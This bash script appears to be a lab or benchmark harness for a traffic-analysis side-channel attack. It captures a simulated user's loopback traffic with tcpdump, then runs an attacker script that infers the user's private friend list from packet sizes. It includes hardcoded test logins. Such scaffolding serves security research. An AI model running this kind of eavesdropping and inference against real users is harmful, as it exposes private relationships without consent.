#!/bin/bash
set -e

REBUILD=0

if [ "$#" -eq 1 ]; then
    if [ "$1" == "rebuild" ]; then
        REBUILD=1
    fi
fi


# step 1, start tcpdump
echo "Start eavesdropping on user"
/usr/sbin/tcpdump -i lo -w usertraffic.pcap tcp port 8080 > /dev/null &
TCPDUMP_PID=$!
sleep 1

# step 2, have a normal user login and display their friends (that are unknown to attacker).
echo "User logs in and displays their friends - something unknown to the attacker"
python ../../../benign/interact.py 127.0.0.1 8080 devenmartinez@hotmail.com PS1Ljv4NPs -p "707949533c4b7de5,2c4b3c3e57648c55,636954127180d271,796b76720e5f517c,7645497c3f69a80e,1940291c3d7f09c6,4a54797d6f53642e,435748582d2659c4,2037721b5e71b788,5167392e160f61ad,67096923043c4114,5b23700c1a46d277,551e236d7a1d7954,7b5762274701bdc6,0436535c7a0928a2,570a245a1e544c66,5f604e1f216513b4,234a194103154bec,062618694a6260a5,2b2c351f646dc6dd,763f3b04802ad56b,6260161352416e9d,414d6535472d3111,67017d005b79ced7,7a1768596d69eee4,1c3672193630246b,3e4d361c6a7ceed8,50500230025043fb,194531001c61218d,2327163143576840,79530f7f0061ed35,4d0b1454406256b1,2828442e6108dd68,054c1c05250aad75,424e6b4e321b4440,6d413f563841d906,755e460f523dfb50" > /dev/null

# step 3, stop tcpdump
sleep 1
echo "Stop eavesdropping"
kill $TCPDUMP_PID > /dev/null

export PYTHONPATH=$PYTHONPATH:../../../benign
# step 4, have the attacker build the image profile database
if [ $REBUILD -eq 1 ]; then
    echo "Start building a profile image -> size database"
    python ../../friendsattack.py 127.0.0.1 8080 build mateojohnson@gmail.com Pv9m53YmANf lo sizedb.json > /dev/null
else
    echo "Skipping building of profile image table, if you want to rebuild it run this script as ./malicious.sh rebuild"
fi

# step 5, have the attacker guess the user's friends
echo "Find the user's friends based on the packet sizes extracted from the pcap"
python ../../friendsattack.py 127.0.0.1 8080 find sizedb.json usertraffic.pcap
